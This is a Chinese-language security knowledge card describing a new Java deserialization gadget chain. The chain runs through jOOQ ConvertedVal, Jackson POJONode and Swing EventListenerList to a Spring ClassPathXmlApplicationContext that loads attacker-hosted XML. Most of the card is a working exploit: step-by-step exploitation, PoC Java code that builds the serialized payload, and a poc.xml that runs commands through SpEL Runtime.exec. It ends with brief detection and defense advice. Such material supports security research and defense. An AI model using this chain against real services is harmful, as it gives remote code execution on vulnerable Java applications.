---
id: web-java-deser-any-getter-jooq-convert-newinstance-spring-xml
title: 「任意 getter → newInstance」新 sink：jOOQ ConvertedVal.getValue 经 Convert.convert 反射调用 ClassPathXmlApplicationContext 单参构造，加载远程 XML；用 EventListenerList→toString→POJONode 把任意 getter 接进反序列化链
type: scenario
domain: web
path: web/java/deserialization
technique: any-getter-convert-newinstance-spring-xml-gadget
aliases:
- jooq ConvertedVal getValue
- Convert.convert toClass Constructor newInstance
- 任意 getter 到任意单参构造
- EventListenerList POJONode 任意 getter
- ClassPathXmlApplicationContext 远程 XML
tags:
- java
- deserialization
- gadget
- jooq
- hutool
- jackson
- spring
- getter
- newinstance
- rce
- codeql
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3W4B
  verified_at: '2026-11-08T22:04:14+08:00'
  notes: 已对照原文核对（本次核对未读取图片，仅依据正文贴出的 CodeQL 查询、jOOQ 构造代码与调用链说明）：ConvertedVal.getValue → Convert$ConvertAll.from（取 toClass 的 Constructor/ParameterType 后 newInstance）→ Convert.convert 赋值 toClass → AbstractDataType.convert / DefaultDataType.getType 返回 uType，这四段与原文「Sink2Source 继续往上找」的三次回溯一致；构造顺序 Dual → TableDataType(table) → Val("whatever", tableDataType, false) → ConvertedVal(val, tableDataType)、反射写 value 与 uType=ClassPathXmlApplicationContext.class、生成端用 Javassist 删 BaseJsonNode.writeReplace、EventListenerList 的 listenerList 设 {InternalError.class, undoManager} 且 edits Vector 放 POJONode，均与原文 PoC 代码一致；poc.xml 的 `#{T(Runtime).getRuntime().exec(...)}` 与 ClassPathXmlApplicationContext("http://.../poc.xml") 也与原文一致。核对时做了两处修正：①原文回溯共 4 段（ConvertAll.from / Convert.convert / AbstractDataType.convert / ConvertedVal.getValue），卡内原写「三跳」却列了 4 条，已改为「四段调用链」；②aliases 里的「Atom」在正文中无对应内容，原文亦未提及 org.jooq.impl.Atom，已删除该 alias；另把触发源说明里的类名拼写 BadAttributeValueExpExpression 更正为 BadAttributeValueExpException。本卡非 DoS/资源类，链路已打通至命令执行（原文给的
    PoC 完整可复现）。dedup：与 web-java-deserialization-jackson-pojonode-spring-aop-templatesimpl-jdk17（0.164，同为 EventListenerList 触发源但 sink 落到 TemplatesImpl）差异成立——本卡 sink 为构造器+Spring XML，不需 --add-opens 但需出网；与同篇 hutool 卡（0.139）分属不同 sink。未验证点：原文自述 Convert/ConvertAll/AbstractDataType/ConvertedVal 有几处操作数未找到，confidence 保持 medium；未复现。jOOQ 原文未标版本，未设 affected_versions。本次核对未读取图片。
---

## 一句话结论

当目标 classpath 里同时有 jOOQ、Hutool 与 Jackson 时，可以造一条"不碰 TemplatesImpl、不碰 JNDI"的反序列化链：`EventListenerList.readObject → UndoManager.toString → Vector.toString → POJONode.toString` 触发**任意 getter**，被调到的 getter 是 `jooq` 的 `ConvertedVal.getValue()`，它一路走到 `Convert.convert` 里的 `Constructor.newInstance(...)`，把攻击者指定的 `ClassPathXmlApplicationContext("http://attacker/poc.xml")` 实例化，从而加载远程 Spring XML 执行命令。

## 原理

- **为什么要"任意 getter"这个中间原语**：反序列化链的触发点（`readObject`/`toString`/`hashCode`/`compare`）种类有限，而真实 classpath 里能直接到命令执行的 sink 更少。`POJONode.toString()` 会把内部对象当普通 Bean 交给 Jackson 序列化，Jackson 遍历所有 public getter —— 等价于"以攻击者选定的对象为 this，调用任意无参 getter"。这就把"找 sink"变成了"找任何一个 getter 里藏着危险动作的类"。
- **jOOQ 侧的可控点**：`ConvertedVal.getValue()` 返回 `delegate.getValue()`（本例是攻击者给的字符串 URL），而 `Convert.convert(from, toClass)` 会用 `toClass` 的 `Constructor`（参数类型取自 `ConvertAll.toClass` 的 parameterTypes）去 `newInstance(from)`。把 `toClass` 设为 `ClassPathXmlApplicationContext`、`from` 设为远程 XML 的 URL 字符串，`newInstance` 即完成"加载远程 XML"这个动作。
- **sink 到 source 的四段调用链**（原文用 CodeQL 以"任意 get→newInstance"为 source/sink 挖出，这里按调用方向描述）：
  1. `Convert$ConvertAll.from()` 取 `toClass` 的 `Constructor` 与 `ParameterType`，把 `from` 作为参数实例化；
  2. 上一层 `Convert.convert()` 的另一分支在实例化时给 `toClass` 赋值，并调用 `ConvertAll.from`；
  3. `AbstractDataType.convert()` 用 `DefaultDataType.getType()` 返回的 `uType`（即 `toClass`）走同一路径；
  4. 最上层 `ConvertedVal.getValue()` 取出 `delegate.getValue()` 作为 `from`。因此只要构造 `Val`/`TableDataType`/`ConvertedVal` 三个 jOOQ 对象并反射写好 `value` 与 `uType` 字段，`getValue()` 就是一条"参数可控的单参构造调用"。
- **为什么链能串起来**：`EventListenerList.readObject` 反序列化时会 `add` 元素，`UndoManager.toString()` 遍历 `Vector` 并对元素调 `String.valueOf`，于是 `Vector` 里放的 `POJONode` 被 `toString` —— 这正是 JDK15+ 之后仍可用的 toString 触发源（`BadAttributeValueExpException.val` 在 JDK15 起改为 String 类型后失效，但这条没受影响）。
- **生成端的小障碍**：`POJONode` 序列化时受 `BaseJsonNode.writeReplace` 影响会被替换掉，导致反序列化端拿到的不是 `POJONode`；用 Javassist 在生成端把 `BaseJsonNode.writeReplace` 方法删掉即可（只影响生成进程，不影响目标）。
- **构造约束**：`ConvertedVal`/`Val`/`TableDataType` 的构造器不是 public 的，需要用 `getDeclaredConstructors()[0]` + `setAccessible(true)`，再反射设置 `value`、`uType` 字段；`Dual` 用来给 `TableDataType` 提供表对象。

## 触发条件

- 目标 classpath 同时具备：`org.jooq`（`ConvertedVal`/`Val`/`TableDataType`/`Dual`）、`com.fasterxml.jackson.databind`（`POJONode`）、以及 `spring-context`（`ClassPathXmlApplicationContext` 可被实例化）。
- 存在 Java 原生反序列化入口（`ObjectInputStream`），且黑名单未覆盖 `javax.swing.event.EventListenerList`/`javax.swing.undo.UndoManager`/`org.jooq.**`/`com.fasterxml.jackson.databind.node.POJONode`。
- 目标能出网访问攻击者的 XML（`ClassPathXmlApplicationContext` 支持 http URL 作为配置位置）。
- 生成端能运行 Javassist（或用其它方式产出可反序列化的 `POJONode`）。

## 利用步骤

1. 攻击者准备 `poc.xml`：`<bean id="e" class="java.lang.String"><constructor-arg value="#{T(Runtime).getRuntime().exec('...')}"/></bean>`，HTTP 暴露。
2. 按 sink→source 顺序构造 jOOQ 对象：`Dual` → `TableDataType(table)` → `Val("whatever", tableDataType, false)` → `ConvertedVal(val, tableDataType)`。
3. 反射写字段：`val.value = "http://attacker/poc.xml"`，`tableDataType.uType = ClassPathXmlApplicationContext.class`。
4. 生成端用 Javassist 移除 `BaseJsonNode.writeReplace`，再 `new POJONode(convertedVal)`。
5. 组装触发链：`EventListenerList` 的 `listenerList` 字段设为 `new Object[]{ InternalError.class, undoManager }`，`undoManager` 的 `edits` Vector 里放该 `POJONode`。
6. 序列化 `EventListenerList` 得到 payload，base64 后投递给反序列化入口；目标 `readObject` 时依次触发 `toString → getValue → convert → newInstance → 加载 XML → 执行命令`。
7. 校验：先给个能出网的命令（`curl`/写文件）确认落地，再按需替换。

## PoC

```java
// 1) jOOQ 侧 sink 构造（非 public 构造器 + 反射字段）
Class<?> c1 = Class.forName("org.jooq.impl.Dual");
Constructor<?> k1 = c1.getDeclaredConstructors()[0]; k1.setAccessible(true);
Object table = k1.newInstance();

Class<?> c2 = Class.forName("org.jooq.impl.TableDataType");
Constructor<?> k2 = c2.getDeclaredConstructors()[0]; k2.setAccessible(true);
Object tableDataType = k2.newInstance(table);

Class<?> c3 = Class.forName("org.jooq.impl.Val");
Constructor<?> k3 = c3.getDeclaredConstructor(Object.class, DataType.class, boolean.class);
k3.setAccessible(true);
Object val = k3.newInstance("whatever", tableDataType, false);

Class<?> c4 = Class.forName("org.jooq.impl.ConvertedVal");
Constructor<?> k4 = c4.getDeclaredConstructors()[0]; k4.setAccessible(true);
Object convertedVal = k4.newInstance(val, tableDataType);

ReflectUtil.setFieldValue(val, "value", "http://127.0.0.1:7777/poc.xml");
ReflectUtil.setFieldValue(tableDataType, "uType", ClassPathXmlApplicationContext.class);
// convertedVal.getValue() 即 new ClassPathXmlApplicationContext("http://.../poc.xml")

// 2) 生成端去掉 POJONode 的 writeReplace，保证反序列化端仍是 POJONode
CtClass ct = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
ct.removeMethod(ct.getDeclaredMethod("writeReplace"));
ct.toClass();

// 3) 触发链：EventListenerList -> UndoManager.toString -> Vector.toString -> POJONode.toString
POJONode pojoNode = new POJONode(convertedVal);
UndoManager undoManager = new UndoManager();
Vector edits = (Vector) ReflectUtil.getFieldValue(undoManager, "edits");
edits.add(pojoNode);
EventListenerList ell = new EventListenerList();
ReflectUtil.setFieldValue(ell, "listenerList", new Object[]{InternalError.class, undoManager});
byte[] payload = SerializeUtil.serialize(ell);
```

```xml
<!-- poc.xml：Spring bean 构造参数里执行 SpEL -->
<beans xmlns="http://www.springframework.org/schema/beans">
  <bean id="evil" class="java.lang.String">
    <constructor-arg value="#{T(Runtime).getRuntime().exec('id')}"/>
  </bean>
</beans>
```

## 变体与关联

- getter 换形：任何"getter 里调 `convert`/`newInstance`/`load`/`lookup`"的类都可替换 `ConvertedVal.getValue`，CodeQL 以 `get*` 为 source、`newInstance` 为 sink 批量挖。
- 触发源换形：`EventListenerList → UndoManager → Vector`、HashMap 哈希冲突键、`TextAndMnemonicHashMap.get`、`BadAttributeValueExpException`（JDK15 前）。
- toString 桥接：`AtomicReference.toString()` 会调 `value.toString()`，可用来在 `toString` 之后再套一层任意对象；Hutool `JSONObject.put/set/wrap` 在写入时就会调 getter，若用于序列化会提前触发导致字段丢失，需改用 Hessian 的 `writeMapBegin/writeObject/writeMapEnd` 手工构造 map 条目。
- 与 `EventListenerList → Spring AOP → TemplatesImpl` 的区别：那条落到 `TemplatesImpl` 字节码加载（JDK17 需绕过模块封装）；本卡落到 Spring `ClassPathXmlApplicationContext` 远程 XML，不需要 `--add-opens`，但要求目标能出网拉 XML。
- 与 H2 `INIT`/`runscript` 链的区别：那条走 JDBC sink；本卡走构造器 + Spring 配置加载。

## 检测与防御

- 检测：反序列化入口出现 `org.jooq.impl.ConvertedVal`、`com.fasterxml.jackson.databind.node.POJONode`、`javax.swing.event.EventListenerList`；JVM 启动后异常发起对 `.xml` 的出站 HTTP 请求；Spring 容器在运行期加载外部 XML。
- 防御：反序列化白名单（覆盖 jOOQ/Jackson 节点/Swing 事件类）；`ObjectInputFilter` 按类名与方法数限制；关闭 `ClassPathXmlApplicationContext` 对远程 URL 的支持（自定义 `Resource` 白名单）；限制应用出网。
